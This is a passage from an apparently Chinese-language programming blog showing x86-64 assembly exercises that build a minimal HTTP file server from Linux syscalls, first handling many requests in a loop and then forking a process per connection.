class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp exit_success         # 跳转到成功退出</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区l</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.7 Program that dynamically responds to multiple HTTP GET requests"></a>1.7 Program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">		# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">		# bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            				# 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  				# sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line">		</span><br><span class="line">		# listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">		# accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">		# read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">		# open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp accept_loop          # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests"></a>1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">    # accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # fork 函数调用</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值</span><br><span class="line">    js exit_failure        # 如果fork失败则退出</span><br><span class="line">    jz child_process       # 如果是子进程则跳转</span><br><span class="line"></span><br><span class="line">    # 父进程</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 关闭已接受的连接</span><br><span class="line">    syscall</span><br><span class="line">    jmp accept_loop        # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    # 关闭监听套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 3             # 关闭监听套接字</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]   # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi           # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0  # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2             # syscall: open</span><br><span class="line">    mov rdi, rdi           # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi           # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值以检查错误</span><br><span class="line">    js exit_failure        # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax           # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax           # 保存文件描述符</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区</span><br><span class="line">    mov rdx, 1024          # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12           # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]    # 响应内容的位置</span><br><span class="line">    mov rdx, 19            # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15           # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512             # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

